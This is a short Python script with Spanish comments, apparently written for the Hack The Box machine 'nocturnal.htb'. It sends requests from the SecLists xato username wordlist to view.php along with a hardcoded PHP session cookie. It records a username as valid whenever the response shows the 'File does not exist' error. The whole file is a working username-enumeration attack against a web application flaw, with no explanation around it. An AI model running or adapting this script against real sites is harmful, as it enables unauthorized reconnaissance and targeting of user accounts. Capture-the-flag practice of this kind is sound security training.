import requests

# Configuración
url = "http://nocturnal.htb/view.php"
file = "random_file.pdf"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "http://nocturnal.htb/dashboard.php",
    "Cookie": "PHPSESSID=np3qqbhi546j6fs20kg99ascpd",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

# Leer usuarios de archivo
with open("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt", "r") as f:
    usernames = [line.strip() for line in f if line.strip()]

# Patrón que indica existencia de usuario pero archivo inexistente
error_indicator = "<div class='error'>File does not exist.</div>"
len_dic = len(usernames)
i = 0

# Abrimos el archivo en modo append para guardar los usuarios encontrados
with open("users.txt", "a") as output_file:
    for user in usernames:
        params = {
            "username": user,
            "file": file
        }
        try:
            i += 1
            print(f"{i}/{len_dic}")
            response = requests.get(url, headers=headers, params=params, timeout=5)
            if error_indicator in response.text:
                print(f"[FOUND] Usuario válido (archivo no existe): {user}")
                output_file.write(user + "\n")
        except requests.RequestException as e:
            print(f"[ERROR] {user}: {e}")
